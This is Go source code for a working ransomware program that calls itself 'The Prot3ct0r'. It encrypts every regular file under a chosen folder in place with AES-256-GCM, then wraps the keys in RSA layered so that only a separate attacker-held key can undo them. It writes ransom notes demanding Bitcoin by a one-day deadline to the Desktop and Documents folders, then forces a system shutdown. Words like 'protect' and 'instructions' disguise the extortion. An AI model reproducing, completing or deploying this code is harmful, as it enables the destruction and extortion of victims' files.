package main

import (
    "fmt"
    "log"
    "os"
    "path/filepath"
    "strings"
    "crypto/rand"
    "strconv"
    "io"
    "crypto/cipher"
    "crypto/aes"
    "io/ioutil"
    "crypto/rsa"
    "encoding/pem"
    "crypto/x509"
    "crypto/sha512"
    "os/exec"
     "time"
)

func banner(){
  fmt.Printf("\x1b[35m%s\x1b[0m\n", "\r\n#######################")
  fmt.Printf("\x1b[1m\x1b[37m%s\x1b[0m\n", "The Prot3ct0r")
  fmt.Printf("\x1b[35m%s\x1b[0m\n", "#######################\r\n")
}

func help(){

  fmt.Println(`    -------DEMO USAGE-------`)
  fmt.Println(`[+] usage example: mybinary.exe demo`)
  fmt.Println(`[+] demo: mybinary.exe C:\Users\CurrentUser\ 139nvEm4dnfbCN9nux3J94yJg2NhFC2Kpg Bitcoin 1 test@gmail.com`+"\n")

  fmt.Println(`    -------ADV USAGE-------`)
  fmt.Println(`[+] usage example: mybinary.exe pathtoprotect address cryptocurrency amount mail`)
  fmt.Println(`[+] usage example: mybinary.exe C:\Users\User1\AppData\Local\Temp 139nvEm4dnfbCN9nux3J94yJg2NhFC2Kpg Bitcoin 1 test@gmail.com`)

}

func getargs() (args []string){
  argsWithoutProg := os.Args[1:]
if len(argsWithoutProg) == 0 {
  fmt.Println(`[+] Operation failed, not enough parameters!`+"\n")
  help()
  os.Exit(0)
} else if argsWithoutProg[0] == "demo" {
  argsWithoutProg = append(argsWithoutProg[:0], argsWithoutProg[0+1:]...)
  argsWithoutProg = append(argsWithoutProg, getUserRepo()+"\\", "139nvEm4dnfbCN9nux3J94yJg2NhFC2Kpg", "Bitcoin", "1" ,"test@gmail.com")
  fmt.Println("demo mode")
} else if len(argsWithoutProg) < 5 {
  fmt.Println(`[+] Operation failed, not enough parameters!`+"\n")
  help()
  os.Exit(0)
} else if len(argsWithoutProg) > 5{
  fmt.Println(`[+] Operation failed, too much parameters!`+"\n")
  help()
  os.Exit(0)
}
return argsWithoutProg
}

func remove(s []string, r string) []string {
    for i, v := range s {
        if v == r {
            return append(s[:i], s[i+1:]...)
        }
    }
    return s
}

func check(e error) {
    if e != nil {
      panic(e)
    }
}

func getUserRepo() string {
    dirname, err := os.UserHomeDir()
    if err != nil {
      log.Fatal( err )
    }
    return  dirname
}

func getRecursiveFiles(dir string) (string, int) {
  fmt.Println("[+] Getting files to protect...")
  var arrayFiles []string
  err := filepath.Walk(dir,
  func(f string, a os.FileInfo, err error) error {
  if err != nil {
    //return err
  }
  if a.Mode().IsRegular(){ //if regular file then append to the list
    arrayFiles = append(arrayFiles,f)
  }
  return nil
  })
  if err != nil {
    log.Fatal(err)
  }

  path, err := os.Getwd()
  if err != nil {
	log.Println(err)
  }

  files1, err := ioutil.ReadDir(path)
    if err != nil {
        log.Fatal(err)
    }

    for _, file1 := range files1 {
        if file1.IsDir() {
        }
        arrayFiles = remove(arrayFiles, path+"\\"+file1.Name())
    }


  arrLength := len(arrayFiles)
  result := strings.Join(arrayFiles, "?")
  return result, arrLength
}

func AES256generation(filen int) {
  fmt.Println("[+] Generate priv keys...")

  filen = filen / 1000 + 1
  for i := 1; i < filen + 1; i++ {
    namefile :="key"+strconv.Itoa(i)

    files, erro := os.Create(namefile)
    if erro != nil {
        log.Fatal("Cannot create file", erro)
      }
    defer files.Close()

    key := make([]byte, 32)
    _, err := rand.Read(key)
    if err != nil {
        // handle error here
      }

    _, erroo := files.Write(key)
    check(erroo)

      }
}

func AESprotect(filetoprotect string, keyaes string){
  plaintext, err := ioutil.ReadFile(filetoprotect)
	if err != nil {
    fmt.Println(filetoprotect)
    fmt.Println("Readfiletoprotect")
		//log.Fatal(err)
	}

	// The key should be 16 bytes (AES-128), 24 bytes (AES-192) or
	// 32 bytes (AES-256)
	key, err := ioutil.ReadFile(keyaes)
	if err != nil {
    fmt.Println("Readfileaes")
		//log.Fatal(err)
	}
	block, err := aes.NewCipher(key)
	if err != nil {
    fmt.Println("NewCipher")
		//log.Panic(err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
    fmt.Println("NewGCM")
		//log.Panic(err)
	}

	// Never use more than 2^32 random nonces with a given key
	// because of the risk of repeat.
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
    fmt.Println(filetoprotect)
    fmt.Println("ReadFull")
		//log.Fatal(err)
	}

	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	// Save back to file
	err = ioutil.WriteFile(filetoprotect, ciphertext, 0666)
	if err != nil {
    fmt.Println(filetoprotect)
    fmt.Println("WriteFile")
		//log.Panic(err)
	}
}

func AESprotectLauncher(allfiles string, totalnbkey int ){
  fmt.Println("[+] Protecting files...")
  totalnbkey = totalnbkey/1000+1
  //fmt.Println(totalnbkey)
  allfilesarray := strings.Split(allfiles, "?")
  //fmt.Println(allfilesarray)
  counter := 0
  keynumber :=1
  for _,element := range allfilesarray{
    counter ++
    if counter == 1000{
      keynumber ++
      counter = 0
    }
    //fmt.Println(element)
    keytouse := "key"+strconv.Itoa(keynumber)
    AESprotect(element, keytouse) //WATCH OUT
  }
}

func GenerateRSAKeyPair(){
  fmt.Println("[+] Generate rsa key pair...")
  filename := "rsakey"
  bitSize := 4096

  // Generate RSA key.
  key, err := rsa.GenerateKey(rand.Reader, bitSize)
  if err != nil {
      panic(err)
  }

  // Extract public component.
  pub := key.Public()

  // Encode private key to PKCS#1 ASN.1 PEM.
  keyPEM := pem.EncodeToMemory(
      &pem.Block{
          Type:  "RSA PRIVATE KEY",
          Bytes: x509.MarshalPKCS1PrivateKey(key),
      },
  )

  // Encode public key to PKCS#1 ASN.1 PEM.
  pubPEM := pem.EncodeToMemory(
      &pem.Block{
          Type:  "RSA PUBLIC KEY",
          Bytes: x509.MarshalPKCS1PublicKey(pub.(*rsa.PublicKey)),
      },
  )

  // Write private key to file.
  if err := ioutil.WriteFile(filename+".rsa", keyPEM, 0700); err != nil {
      panic(err)
  }

  // Write public key to file.
  if err := ioutil.WriteFile(filename+".rsa.pub", pubPEM, 0755); err != nil {
      panic(err)
  }
}

func loadPubkey()*rsa.PublicKey{
fmt.Println("[+] Loading public key to protect the sym keys...")
filepath := (".\\rsakey.rsa.pub")
keyData, _ := ioutil.ReadFile(filepath)
block, _ := pem.Decode(keyData)
	if block == nil {
		//skip
	}
  publicKey, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		//skip
	}
return publicKey
}

func RSAProtectfiles(publicKey *rsa.PublicKey, totalnbkey int){
  fmt.Println("[+] Protecting priv keys...")
  totalnbkey = totalnbkey/1000+1
  counter := 1
  for counter < totalnbkey+1{
    path := ".\\key"+strconv.Itoa(counter)
    counter ++
    rsafilecontent, err := os.ReadFile(path)
    if err != nil {
          fmt.Print(err)
      }
    hash := sha512.New()
    ciphertext, err := rsa.EncryptOAEP(hash, rand.Reader, publicKey, rsafilecontent, nil)

    out, err := os.Create(path)
    if err != nil {
      //return err
    }
    defer out.Close()
    _, err = out.Write(ciphertext)
    if err != nil {
      //return err
    }
  }
}

func loadgamechanger()*rsa.PublicKey{
fmt.Println("[+] Loading public key to protect the Unprotect0r key...")
filepath := (".\\KEYPROTECT.rsa.pub")
keyData, _ := ioutil.ReadFile(filepath)
block, _ := pem.Decode(keyData)
  if block == nil {
    //skip
  }
  publicKey, err := x509.ParsePKCS1PublicKey(block.Bytes)
  if err != nil {
    //skip
  }
return publicKey
}

func RSAProtecttheprotector(publicKey *rsa.PublicKey) ([]byte, error){
    //fmt.Println(publicKey)
    fmt.Println("[+] Protecting the Unprotect0r key...")

      //FILETOPROTECT
      pemString,_ := ioutil.ReadFile(".\\rsakey.rsa")
      //fmt.Println(pemString)

      //Encryptprocess
      var encryptedBytes []byte
      msgLen := len(pemString)
      hash := sha512.New()
      step := publicKey.Size() - 2*hash.Size() - 2

      for start := 0; start < msgLen; start += step {
        finish := start + step
        if finish > msgLen {
            finish = msgLen
        }

        encryptedBlockBytes, err := rsa.EncryptOAEP(hash, rand.Reader, publicKey, pemString[start:finish], nil)
        if err != nil {
            return nil, err
        }

        encryptedBytes = append(encryptedBytes, encryptedBlockBytes...)
    }

    out, err := os.Create(".\\rsakey.rsa")
    if err != nil {
        //return err
      }

      defer out.Close()
      _, err = out.Write(encryptedBytes)
      if err != nil {
        //return err
      }
    return encryptedBytes, nil
    }


func getrepoforinstructions(args []string){
      address := args[1]
      mean := args[2]
      amount := args[3]
      support := args[4]

      //inform user that he got protected
      dbUser := os.Getenv("USERPROFILE")
      path1 := dbUser + "\\Desktop\\"
      path2 := dbUser + "\\Documents\\"

      for i := 0; i < 10; i++ {
        namefile := "instruction"+strconv.Itoa(i)+".txt"
        pathdesktop := path1 + namefile
        pathdocument := path2 + namefile
        createfile(pathdesktop,address,mean,support,amount)
        createfile(pathdocument,address,mean,support,amount)
    }
    fmt.Println("[+] Instruction created")
}

func createfile(path string,address string,mean string, support string, amount string){
  currentTime := time.Now()
  currentTime = currentTime.AddDate(0, 0, +1)
  f, err := os.Create(path)
  if err != nil {
      log.Fatal(err)
  }
  defer f.Close()
  _, err2 := f.WriteString("Your files are protected please follow the instructions:" + "\n" +
"1 - thank you to provide "+ amount + " " + mean + " at the address: " + address +  "\n" +
"2 - Support can be reach at: " + support + "\n" +
"3 - After the next date, you would not be able to unprotect data: " + currentTime.Format("2006-01-02 3:4:5"))

  if err2 != nil {
      log.Fatal(err2)
  }

}

func shutdown() {
      //wipe memory
      if err := exec.Command("cmd", "/C", "shutdown", "/s").Run(); err != nil {
        fmt.Println("Failed to initiate shutdown:", err)
        fmt.Println("[+] DONE! ")
  }
}

func main() {
banner()

//get parameters from user
argsWithoutProg := getargs() //args 0 = path ; args 1 = address ; args 2 = mean ; args 3 = amount ; args 4 = support
fmt.Println(argsWithoutProg)

//protect files
allfiles, nballfiles := getRecursiveFiles(argsWithoutProg[0])
AES256generation(nballfiles)
AESprotectLauncher(allfiles, nballfiles)

//protect AES keys
GenerateRSAKeyPair()
publicKey := loadPubkey()
RSAProtectfiles(publicKey, nballfiles)

//protect RSA key
finalpubkey :=loadgamechanger()
RSAProtecttheprotector(finalpubkey)

//sharing instructions
getrepoforinstructions(argsWithoutProg)

//shutdown for wiping memory
shutdown()


}
